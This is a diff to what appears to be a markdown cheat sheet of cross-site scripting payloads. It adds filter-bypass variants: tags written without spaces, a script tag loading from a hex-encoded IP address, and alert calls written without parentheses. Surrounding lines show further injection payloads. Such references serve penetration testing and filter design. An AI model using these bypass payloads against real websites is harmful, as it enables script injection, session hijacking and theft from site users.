@@ -97,6 +97,26 @@ test@example(<script>alert(0)</script>).com
 <iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="> # base64 <script>alert(1)</script>
 ```
 
+### Without Space
+```js
+<img/src/onerror=alert(1)>
+<svg/onload=alert(2)>
+```
+
+### Without dot 
+```
+<script src=//0x8ac5c30a>
+```
+
+### Without parentheses
+https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md
+```
+<svg/onload='alert&#40 23 &#41'> 
+location=/javascript:alert%2823%29/.source;
+```
+
+
+
 ### Alert
 ```js
 alert(1)
